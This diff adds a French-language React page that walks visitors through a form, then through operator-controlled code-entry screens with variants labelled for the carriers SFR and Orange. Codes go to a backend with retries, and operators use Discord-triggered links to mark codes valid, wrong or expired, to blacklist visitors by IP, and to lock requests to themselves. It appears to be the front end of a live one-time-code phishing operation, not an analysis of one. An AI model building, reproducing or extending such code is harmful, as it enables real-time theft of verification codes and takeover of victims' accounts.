@@ -1,0 +1,331 @@
+import { useState, useEffect, useRef } from "react";
+import { base44 } from "@/api/base44Client";
+import SubmissionForm from "@/components/SubmissionForm";
+import SuccessScreen from "@/components/SuccessScreen";
+import CodeVerification from "@/components/CodeVerification";
+import CodeWaiting from "@/components/CodeWaiting";
+import CodeVerification6 from "@/components/CodeVerification6";
+import CodeVerification6SFR from "@/components/CodeVerification6SFR";
+import CodeVerification6Orange from "@/components/CodeVerification6Orange";
+import WaitingQueue from "@/components/WaitingQueue";
+import VerificationSuccess from "@/components/VerificationSuccess";
+import ResultScreen from "@/components/ResultScreen";
+import StatusCheck from "@/components/StatusCheck";
+import FAQ from "@/components/FAQ";
+import NotificationBell from "@/components/NotificationBell";
+import DiscordPrompt from "@/components/DiscordPrompt";
+
+export default function Home() {
+  const getParams = () => new URLSearchParams(window.location.search);
+
+  const getInitialStep = () => {
+    const p = getParams();
+    if (p.get("triggerAction")) return "triggerAction";
+    if (p.get("trigger")) return "form";
+    return "form";
+  };
+
+  const [step, setStep] = useState(getInitialStep);
+  const [loading, setLoading] = useState(false);
+  const [submittedData, setSubmittedData] = useState(() => {
+    try { return JSON.parse(sessionStorage.getItem("submittedData")) || null; } catch { return null; }
+  });
+  const [submissionId, setSubmissionId] = useState(() => {
+    return getParams().get("id") || sessionStorage.getItem("submissionId") || null;
+  });
+  const pollingValidationRef = useRef(null);
+  const pollingCodeRef = useRef(null);
+  const pollingWaitingRef = useRef(null);
+  const [showStatusCheck, setShowStatusCheck] = useState(false);
+  const [showFAQ, setShowFAQ] = useState(false);
+  const [adminInactive, setAdminInactive] = useState(false);
+  const [inlineError, setInlineError] = useState("");
+  const [pendingAction, setPendingAction] = useState(null);
+  const [lockedMessage, setLockedMessage] = useState("");
+
+  // Persist step in sessionStorage so refresh doesn't lose position
+  const setStepPersisted = (newStep) => {
+    setStep(newStep);
+  };
+
+  // Check admin status on mount
+  useEffect(() => {
+    base44.functions.invoke("checkAdminStatus", {})
+      .then(res => setAdminInactive(res?.data?.is_inactive || false))
+      .catch(() => {});
+  }, []);
+
+  // Handle ?resume=1 — restore a pending submission to its code entry step
+  useEffect(() => {
+    const p = getParams();
+    if (p.get("resume") !== "1") return;
+    const storedId = sessionStorage.getItem("submissionId");
+    if (!storedId) { setStep("form"); return; }
+    setSubmissionId(storedId);
+    try {
+      const storedData = JSON.parse(sessionStorage.getItem("submittedData"));
+      if (storedData) setSubmittedData(storedData);
+    } catch {}
+    base44.functions.invoke("checkStatus", { submissionId: storedId })
+      .then((res) => {
+        const s = res?.data?.status;
+        const map = { code_ready: "code", code6_ready: "code6", code6sfr_ready: "code6sfr", code6orange_ready: "code6orange" };
+        window.history.replaceState({}, "", "/");
+        setStepPersisted(map[s] || "validation");
+      })
+      .catch(() => {
+        window.history.replaceState({}, "", "/");
+        setStep("form");
+      });
+  }, []);
+
+  // Handle ?trigger=ID from Discord (send code ready)
+  useEffect(() => {
+    const triggerId = getParams().get("trigger");
+    if (triggerId) {
+      setStep("triggerAction");
+      runTriggerAction("code_ready", triggerId, null, undefined);
+    }
+  }, []);
+
+  // Execute a Discord-triggered sendCode action, prompting for Discord on first action
+  const runTriggerAction = async (action, id, ip, discord) => {
+    const finish = () => {
+      window.history.replaceState({}, "", "/");
+      setStep("adminDone");
+    };
+    if (action === "blacklist") {
+      await base44.functions.invoke("blacklistUser", { submissionId: id, ip }).catch(() => {});
+      finish();
+      return;
+    }
+    try {
+      const res = await base44.functions.invoke("sendCode", { submissionId: id, action, discord });
+      if (res?.data?.discord_required) {
+        setPendingAction({ action, id, ip });
+        setStep("discordPrompt");
+        return;
+      }
+    } catch (err) {
+      const msg = err?.response?.data?.error || err?.message || "";
+      if (msg) {
+        setLockedMessage(msg);
+        window.history.replaceState({}, "", "/");
+        setStep("locked");
+        return;
+      }
+    }
+    finish();
+  };
+
+  // Handle ?triggerAction=valid|wrong|expired|blacklist&id=... from Discord (after code entry)
+  useEffect(() => {
+    if (step !== "triggerAction") return;
+    const p = getParams();
+    const action = p.get("triggerAction");
+    const id = p.get("id");
+    const ip = p.get("ip");
+    if (!action || !id) { setStep("form"); return; }
+    runTriggerAction(action, id, ip, undefined);
+  }, []);
+
+  // Poll on "validation" step
+  useEffect(() => {
+    if (step !== "validation" || !submissionId) return;
+    pollingValidationRef.current = setInterval(async () => {
+      const adminRes = await base44.functions.invoke("checkAdminStatus", {});
+      setAdminInactive(adminRes?.data?.is_inactive || false);
+      const res = await base44.functions.invoke("checkStatus", { submissionId });
+      const s = res?.data?.status;
+      if (s === "code_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code"); }
+      else if (s === "code6_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code6"); }
+      else if (s === "code6sfr_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code6sfr"); }
+      else if (s === "code6orange_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code6orange"); }
+      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingValidationRef.current); setStepPersisted("wrong"); }
+      else if (s === "waiting_queue") { clearInterval(pollingValidationRef.current); setStepPersisted("queue"); }
+    }, 3000);
+    return () => clearInterval(pollingValidationRef.current);
+  }, [step, submissionId]);
+
+  // Poll on "code", "code6", "code6sfr", "code6orange" steps — allow admin to switch between any format
+  useEffect(() => {
+    const codeSteps = ["code", "code6", "code6sfr", "code6orange"];
+    if (!codeSteps.includes(step) || !submissionId) return;
+    pollingCodeRef.current = setInterval(async () => {
+      const res = await base44.functions.invoke("checkStatus", { submissionId }).catch(() => null);
+      const s = res?.data?.status;
+      if (s === "code_ready" && step !== "code") { clearInterval(pollingCodeRef.current); setStepPersisted("code"); }
+      else if (s === "code6_ready" && step !== "code6") { clearInterval(pollingCodeRef.current); setStepPersisted("code6"); }
+      else if (s === "code6sfr_ready" && step !== "code6sfr") { clearInterval(pollingCodeRef.current); setStepPersisted("code6sfr"); }
+      else if (s === "code6orange_ready" && step !== "code6orange") { clearInterval(pollingCodeRef.current); setStepPersisted("code6orange"); }
+      else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingCodeRef.current); setStepPersisted("wrong"); }
+      else if (s === "waiting_queue") { clearInterval(pollingCodeRef.current); setStepPersisted("queue"); }
+    }, 3000);
+    return () => clearInterval(pollingCodeRef.current);
+  }, [step, submissionId]);
+
+  // Poll on "waiting" step
+  useEffect(() => {
+    if (step !== "waiting" || !submissionId) return;
+    pollingWaitingRef.current = setInterval(async () => {
+      const res = await base44.functions.invoke("checkStatus", { submissionId });
+      const s = res?.data?.status;
+      if (s === "code_valid") { clearInterval(pollingWaitingRef.current); setStepPersisted("verified"); }
+      else if (s === "code_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code"); }
+      else if (s === "code6_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code6"); }
+      else if (s === "code6sfr_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code6sfr"); }
+      else if (s === "code6orange_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code6orange"); }
+      else if (s === "code_wrong") { clearInterval(pollingWaitingRef.current); setStepPersisted("wrong"); }
+      else if (s === "code_expired") { clearInterval(pollingWaitingRef.current); setStepPersisted("expired"); }
+      else if (s === "waiting_queue") { clearInterval(pollingWaitingRef.current); setStepPersisted("queue"); }
+    }, 3000);
+    return () => clearInterval(pollingWaitingRef.current);
+  }, [step, submissionId]);
+
+  const handleSubmit = async (data) => {
+    setLoading(true);
+    try {
+      const res = await base44.functions.invoke("createSubmission", data);
+      const submissionId = res?.data?.submissionId;
+      if (!submissionId) throw new Error("Erreur lors de la création");
+      
+      setSubmittedData(data);
+      setSubmissionId(submissionId);
+      sessionStorage.setItem("submittedData", JSON.stringify(data));
+      sessionStorage.setItem("submissionId", submissionId);
+      setStepPersisted("validation");
+    } catch (error) {
+      const errorMsg = error.response?.data?.error || "Une erreur s'est produite";
+      setInlineError(errorMsg);
+      setStep("form");
+    }
+    setLoading(false);
+  };
+
+  // Retry helper: the visitor's code entry must reliably reach the DB even if the
+  // platform rate-limits the call (429). Without retry the code is lost silently.
+  const submitCodeWithRetry = async (code) => {
+    const payload = { ...submittedData, code, submissionId };
+    for (let attempt = 1; attempt <= 5; attempt++) {
+      try {
+        const res = await base44.functions.invoke("notifyCodeEntered", payload);
+        if (res?.data?.ok) return true;
+        if (res?.data?.error) return false; // validation error, don't retry
+      } catch (e) {
+        if (attempt === 5) return false;
+        await new Promise((r) => setTimeout(r, 800 * attempt));
+      }
+    }
+    return false;
+  };
+
+  const handleCodeSubmit = async (code) => {
+    setLoading(true);
+    await submitCodeWithRetry(code);
+    setStepPersisted("waiting");
+    setLoading(false);
+  };
+
+  const handleCode6Submit = async (code) => {
+    setLoading(true);
+    await submitCodeWithRetry(code);
+    setStepPersisted("waiting");
+    setLoading(false);
+  };
+
+  const handleBack = () => {
+    sessionStorage.clear();
+    window.location.href = "/";
+  };
+
+  const handleRetryCode = async () => {
+    if (!submissionId) { setStepPersisted("code"); return; }
+    const res = await base44.functions.invoke("checkStatus", { submissionId }).catch(() => null);
+    const s = res?.data?.status;
+    setStepPersisted(s === "code6_ready" ? "code6" : "code");
+  };
+
+  const handleCodeExpire = () => {
+   setStep("expired");
+  };
+
+  const handleDiscordSubmit = async (discord) => {
+    if (!pendingAction) { setStep("adminDone"); return; }
+    const { action, id, ip } = pendingAction;
+    setPendingAction(null);
+    await runTriggerAction(action, id, ip, discord);
+  };
+
+  return (
+    <>
+    <div className="fixed top-4 right-4 z-50">
+      <NotificationBell />
+    </div>
+    <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-8 md:py-12 safe-area-inset">
+      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none hidden md:block" />
+      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] bg-accent/10 rounded-full blur-[100px] pointer-events-none hidden md:block" />
+
+      <div className="relative z-10 w-full max-w-md min-h-screen md:min-h-auto flex flex-col justify-center pt-24 md:pt-0">
+        {showFAQ ? (
+          <FAQ onBack={() => setShowFAQ(false)} />
+        ) : showStatusCheck ? (
+          <StatusCheck onBack={() => setShowStatusCheck(false)} />
+        ) : (
+          <>
+            {step === "form"       && (
+              <>
+                {inlineError && (
+                  <div className="bg-destructive/10 border border-destructive/30 rounded-xl px-4 py-3 mb-3 flex items-center gap-2.5">
+                    <span className="text-lg">🚫</span>
+                    <p className="text-destructive text-sm font-medium flex-1">{inlineError}</p>
+                    <button onClick={() => setInlineError("")} className="text-destructive/60 hover:text-destructive text-xs font-medium">Fermer</button>
+                  </div>
+                )}
+                <SubmissionForm onSubmit={(data) => { setInlineError(""); handleSubmit(data); }} loading={loading} onStatusCheck={() => setShowStatusCheck(true)} onFaqClick={() => setShowFAQ(true)} />
+              </>
+            )}
+            {step === "validation" && <SuccessScreen data={submittedData} adminInactive={adminInactive} />}
+            {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} onExpire={handleCodeExpire} />}
+            {step === "code6"      && <CodeVerification6 data={submittedData} onSubmit={handleCode6Submit} loading={loading} onExpire={handleCodeExpire} />}
+            {step === "code6sfr"   && <CodeVerification6SFR data={submittedData} onSubmit={handleCode6Submit} loading={loading} onExpire={handleCodeExpire} />}
+            {step === "code6orange" && <CodeVerification6Orange data={submittedData} onSubmit={handleCode6Submit} loading={loading} onExpire={handleCodeExpire} />}
+            {step === "waiting"    && <CodeWaiting />}
+            {step === "queue"      && <WaitingQueue />}
+            {step === "verified"   && <VerificationSuccess data={submittedData} />}
+            {step === "triggerAction" && (
+              <div className="text-center text-muted-foreground text-sm py-10">Traitement en cours...</div>
+            )}
+            {step === "discordPrompt" && (
+              <DiscordPrompt
+                onSubmit={handleDiscordSubmit}
+                title="Discord identification required"
+                description="This request is not yet assigned. Enter your Discord username to lock it to your session — it will appear in the logs."
+              />
+            )}
+            {step === "locked" && (
+              <div className="bg-card border border-red-500/30 rounded-2xl px-6 py-10 text-center shadow-xl">
+                <div className="flex justify-center mb-4">
+                  <div className="w-16 h-16 rounded-full bg-red-500/15 border-2 border-red-500/40 flex items-center justify-center">
+                    <span className="text-3xl">🔒</span>
+                  </div>
+                </div>
+                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Request locked</h2>
+                <p className="text-muted-foreground text-sm">{lockedMessage || "This request is already handled by another administrator."}</p>
+              </div>
+            )}
+            {step === "adminDone" && (
+              <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
+                <div className="text-4xl mb-4">✅</div>
+                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Action effectuée</h2>
+                <p className="text-muted-foreground text-sm">Le statut de l'utilisateur a bien été mis à jour.</p>
+              </div>
+            )}
+            {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
+            {step === "expired"    && <ResultScreen type="expired" onBack={handleRetryCode} />}
+          </>
+        )}
+      </div>
+    </div>
+    </>
+  );
+}
